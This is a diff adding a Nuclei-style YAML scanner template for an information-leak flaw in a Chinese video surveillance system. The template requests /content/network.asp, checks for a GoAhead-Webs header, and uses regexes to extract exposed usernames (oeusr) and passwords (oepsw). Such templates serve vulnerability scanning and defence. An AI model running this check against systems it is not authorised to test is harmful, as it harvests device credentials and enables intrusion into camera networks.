@@ -1,0 +1,37 @@
+id: poc-yaml-launch-vms-network-info-leak
+
+info:
+  name: 朗驰欣创视频监控系统 network 信息泄露漏洞
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: 信息泄露
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/content/network.asp"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: header
+        words:
+          - "GoAhead-Webs"
+
+      - type: regex
+        part: body
+        regex:
+          - "oeusr=\"([0-9a-zA-Z]+)\""
+          - "oepsw=\"([0-9a-zA-Z]+)\""
+
+    extractors:
+      - type: regex
+        part: body
+        internal: false
+        regex:
+          - "oeusr=\"([0-9a-zA-Z]+)\""
+          - "oepsw=\"([0-9a-zA-Z]+)\""
